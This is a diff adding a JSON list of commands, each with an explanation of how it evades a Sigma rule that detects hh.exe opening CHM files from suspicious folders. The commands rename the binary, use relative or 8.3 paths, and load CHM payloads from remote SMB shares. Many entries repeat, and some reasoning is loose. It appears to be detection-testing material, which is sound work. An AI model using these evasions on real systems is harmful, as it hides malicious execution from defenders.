@@ -1,0 +1,98 @@
+[
+  {
+    "output": "hh.exe C:\\ProgramData\\help_document.chm",
+    "explanation": "The rule relies on a hardcoded list of suspicious directories in the CommandLine parameter. Executing the CHM file from a directory not included in the 'selection_paths' list, such as C:\\ProgramData\\, bypasses the detection."
+  },
+  {
+    "output": "cmd.exe /c \"cd C:\\Users\\Victim\\Downloads\\ && hh.exe payload.chm\"",
+    "explanation": "By changing the working directory first and invoking hh.exe with a relative file path, the CommandLine for hh.exe will only be 'hh.exe payload.chm'. The string '\\Downloads\\' is absent from the hh.exe execution context, evading the path-based selection."
+  },
+  {
+    "output": "hh.exe C:\\Users\\Victim\\APPDAT~1\\Local\\Temp\\malicious.chm",
+    "explanation": "This technique utilizes Windows 8.3 short path naming conventions. By replacing '\\AppData\\' with '\\APPDAT~1\\', the exact string match required by the rule ('\\AppData\\Local\\Temp\\') fails, successfully bypassing the filter."
+  },
+  {
+    "output": "cmd.exe /c \"copy C:\\Windows\\hh.exe C:\\ProgramData\\not_hh.exe && C:\\ProgramData\\not_hh.exe C:\\Users\\%USERNAME%\\Documents\\payload.chm\"",
+    "explanation": "The rule relies on 'selection_img', which filters by the specific process name 'hh.exe' or the OriginalFileName metadata. By copying the binary to a non-monitored directory with a different filename (not_hh.exe), the 'Image|endswith' check is bypassed. Additionally, by placing the CHM payload in 'C:\\Users\\\\Documents\\', it avoids the specific suspicious path keywords defined in 'selection_paths' like \\Downloads\\ or \\Temp\\."
+  },
+  {
+    "output": "hh.exe C:\\Windows\\System32\\oobe\\msoobe.chm",
+    "explanation": "The rule uses 'condition: all of selection_*', meaning both the process must be hh.exe AND the command line must contain one of the suspicious paths. By executing a payload from a path not listed in the 'selection_paths' (such as a subfolder in System32 or a custom application directory), the logical AND condition is not met, and the rule will not fire."
+  },
+  {
+    "output": "hh.exe C:\\ProgramData\\document.chm",
+    "explanation": "This rule relies on a hardcoded list of directories in the 'selection_paths' condition. It can be conceptually bypassed by executing the HTML Help executable (hh.exe) and pointing it to a compiled HTML (.chm) file located in a directory that is not explicitly monitored by the rule, such as C:\\ProgramData\\ or a user's Documents folder."
+  },
+  {
+    "output": "hh.exe C:\\ProgramData\\update_help.chm",
+    "explanation": "The Sigma rule relies on a hardcoded blocklist of specific directory strings in the CommandLine field (e.g., \\Downloads\\, \\Windows\\Temp\\). This can be easily bypassed by staging and executing the CHM payload from a directory that is not explicitly covered in the selection_paths list, such as C:\\ProgramData\\ or C:\\PerfLogs\\."
+  },
+  {
+    "output": "cmd.exe /c cd C:\\Users\\Public\\ && hh.exe payload.chm",
+    "explanation": "By executing the payload using a relative path, the CommandLine argument recorded for the hh.exe process creation event (e.g., Sysmon Event ID 1 or Security Event ID 4688) will often simply be 'hh.exe payload.chm'. Because the absolute path string '\\Users\\Public\\' is not present in the hh.exe command line itself, the selection_paths condition evaluates to false."
+  },
+  {
+    "output": "hh.exe C:\\ProgramData\\update.chm",
+    "explanation": "The rule's 'selection_paths' condition strictly checks for specific strings like '\\Downloads\\' or '\\Windows\\Temp\\'. Executing the CHM file from an unmonitored directory such as C:\\ProgramData\\ bypasses the string matching logic entirely."
+  },
+  {
+    "output": "cmd.exe /c \"cd %USERPROFILE%\\Downloads && hh.exe payload.chm\"",
+    "explanation": "By changing the current working directory first, the command line argument passed to hh.exe is simply 'payload.chm'. Since the process_creation log for hh.exe will not contain the string '\\Downloads\\' in its CommandLine field, the rule is bypassed."
+  },
+  {
+    "output": "hh.exe C:\\Users\\user\\DOWNLO~1\\malicious.chm",
+    "explanation": "The rule relies on exact substring matching for '\\Downloads\\'. Utilizing Windows DOS 8.3 short directory names (e.g., DOWNLO~1) achieves execution from the same folder while evading the specific string signature in the command line."
+  },
+  {
+    "output": "hh.exe \\\\192.168.1.100\\share\\payload.chm",
+    "explanation": "Executing a CHM file directly from a remote SMB share or WebDAV does not include any of the local path strings specified in 'selection_paths', evading the detection while successfully launching the file."
+  },
+  {
+    "output": "copy C:\\Windows\\hh.exe C:\\Windows\\Tasks\\update.exe && C:\\Windows\\Tasks\\update.exe C:\\Users\\Public\\malicious.chm",
+    "explanation": "The rule relies on the 'selection_img' logic, which checks for 'OriginalFileName: HH.exe' or a path ending in '\\hh.exe'. By copying the binary to a different location and renaming it (e.g., update.exe), the 'Image' path check is bypassed. If the logging system does not reliably capture 'OriginalFileName' (which requires specific Sysmon or advanced auditing configuration), the rule will fail to trigger even if the suspicious path 'C:\\Users\\Public\\' is present in the command line."
+  },
+  {
+    "output": "hh.exe C:\\ProgramData\\documentation.chm",
+    "explanation": "The rule uses 'all of selection_*' logic, meaning both the process identification AND the suspicious path must be present. This command uses a common directory (C:\\ProgramData\\) that is not included in the 'selection_paths' list, which explicitly targets Temp, Downloads, Public, and Outlook folders. Therefore, executing a CHM from ProgramData or the root of a secondary drive would bypass the detection."
+  },
+  {
+    "output": "copy C:\\Windows\\hh.exe C:\\Tools\\browser.exe && C:\\Tools\\browser.exe C:\\SafeDir\\payload.chm",
+    "explanation": "The rule relies on 'selection_img' which checks if the OriginalFileName is 'HH.exe' or if the Image path ends with '\\hh.exe'. By copying the binary to a different location with a new name, the 'Image' check is bypassed. If the SIEM environment does not support or hasn't collected the 'OriginalFileName' metadata (which is common in basic Sysmon/Windows Event configurations), the rule fails to trigger. Additionally, the payload is executed from a directory (C:\\SafeDir\\) not listed in the 'selection_paths' filter."
+  },
+  {
+    "output": "C:\\Windows\\hh.exe C:\\Windows\\System32\\Drivers\\etc\\manual.chm",
+    "explanation": "This bypass targets the 'selection_paths' logic. The rule uses an 'all of selection_*' condition, meaning both the executable must be hh.exe AND the command line must contain one of the suspicious paths (like \\Downloads\\ or \\Temp\\). By executing a .chm file from a legitimate or non-blacklisted directory like System32, the 'selection_paths' criteria is not met, causing the 'all of' condition to fail."
+  },
+  {
+    "output": "hh.exe C:\\ProgramData\\payload.chm",
+    "explanation": "The Sigma rule requires ALL selection conditions to match. The 'selection_paths' condition relies on a hardcoded list of specific directories (like Temp, Downloads, Public). Executing the CHM file from an unmonitored directory like 'C:\\ProgramData\\' completely avoids the path condition, bypassing the rule."
+  },
+  {
+    "output": "C:\\Windows\\System32\\hh.exe ms-its:C:\\Users\\Administrator\\Desktop\\help.chm::/script.htm",
+    "explanation": "By placing the compiled HTML help file in a user's Desktop or Documents folder (which are not included in the 'selection_paths' list), the execution successfully evades detection while still executing the CHM content via the ms-its protocol handler."
+  },
+  {
+    "output": "C:\\Windows\\hh.exe C:\\InternalTools\\manual.chm",
+    "explanation": "The Sigma rule uses a logical 'AND' (all of selection_*) between the process name and the command line paths. By executing hh.exe from a directory not listed in the 'selection_paths' (such as a custom root folder like C:\\InternalTools\\ or a non-user directory), the 'selection_paths' condition evaluates to false, failing to trigger the rule."
+  },
+  {
+    "output": "copy C:\\Windows\\hh.exe C:\\Windows\\Temp\\not_hh.exe && C:\\Windows\\Temp\\not_hh.exe C:\\Windows\\Temp\\test.chm",
+    "explanation": "If the EDR/SIEM does not reliably track 'OriginalFileName', renaming the binary to something other than 'hh.exe' bypasses the 'selection_img' condition. Even if it is in a suspicious path, the image name mismatch prevents the 'all of' condition from being met."
+  },
+  {
+    "output": "hh.exe \"\\\\RemoteServer\\Share\\exploit.chm\"",
+    "explanation": "The rule explicitly looks for local sensitive paths like \\Downloads\\ or \\Users\\Public\\. Running a CHM file directly from a network share or a UNC path avoids matching any of the hardcoded suspicious string patterns in the 'selection_paths' section."
+  },
+  {
+    "output": "copy C:\\Windows\\hh.exe C:\\Windows\\Tasks\\update.exe && C:\\Windows\\Tasks\\update.exe C:\\Windows\\Temp\\malicious.chm",
+    "explanation": "The rule relies on 'selection_img' which monitors the Image path ending in '\\hh.exe' or the OriginalFileName metadata. By copying hh.exe to a different directory with a different name (e.g., update.exe), the 'Image' filter is bypassed. If the logging system does not capture or verify the OriginalFileName, the execution will not be flagged."
+  },
+  {
+    "output": "C:\\Windows\\hh.exe C:\\WorkDir\\Project\\manual.chm",
+    "explanation": "The rule uses 'selection_paths' with an 'all of' condition, meaning the CommandLine MUST contain one of the suspicious paths (like \\Downloads\\ or \\Users\\Public\\). Executing a CHM file from a non-blacklisted directory, such as a custom root folder (C:\\WorkDir\\), satisfies the process name check but fails the path check, thus bypassing the rule."
+  },
+  {
+    "output": "C:\\Windows\\hh.exe \"\\\\10.0.0.5\\share\\exploit.chm\"",
+    "explanation": "The rule checks for specific local directory strings. By loading the compiled help file (.chm) directly from a network share (UNC path) or a mapped drive letter not included in the 'selection_paths' list, the command line logic is bypassed."
+  }
+]
